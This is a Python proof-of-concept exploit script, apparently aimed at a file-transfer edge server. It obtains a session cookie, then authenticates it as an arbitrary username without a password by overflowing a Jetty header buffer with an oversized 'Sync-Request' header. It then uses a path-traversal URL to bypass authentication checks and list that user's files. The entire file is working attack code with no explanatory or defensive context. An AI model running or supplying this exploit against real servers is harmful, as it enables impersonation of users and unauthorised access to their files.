#!/usr/bin/env python3
import requests
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
import base64
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-u', dest='user', required=True, help='username')
args = parser.parse_args()

USER = args.user
TARGET = 'https://<edge_server>'
default = {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)', 'Accept-Encoding': '', 'Accept': ''}

def fetch_sessid():
	print('[+] fetching a sessionid')
	headers = dict(default)
	headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
	resp = requests.post(TARGET, headers=headers, data='switch=%OO', verify=False, allow_redirects=False)
	assert resp.status_code == 500 and 'FDX' in resp.cookies , 'failed fetching sessid'
	return resp.cookies['FDX']

def auth_session(sessid):
	print('[+] authenticating session')
	headers = dict(default)
	headers.update({'Cookie': 'FDX=' + sessid,
					'User-Agent': '',
					'Authorization': b'Basic ' + base64.b64encode(USER.encode() + b':'),
					'Content-Length': '0',
					'Sync-Request': 'A'*8000 + '/'})	# overflow Jetty header buffer size of 8192
	resp = requests.get(TARGET, headers=headers, verify=False, allow_redirects=False)
	assert resp.status_code == 500 , 'auth failed'

def call_listfiles(sessid):
	print('[+] calling listfiles')
	headers = dict(default)
	headers.update({'Cookie': 'FDX=' + sessid})
	resp = requests.get(TARGET + '/download_public.html/%2e%2e?list',	# skip authentication checks
						headers=headers, verify=False, allow_redirects=False)
	if resp.status_code == 200:
		print(resp.text)
	elif resp.status_code == 500:
		print('[-] looks like user not found')
	else:
		print('[-] unusual resp: {} {}\n{}'.format(resp.status_code,resp.reason,resp.content))

def main():
	sessid = fetch_sessid()
	auth_session(sessid)
	call_listfiles(sessid)

if __name__ == '__main__':
	main()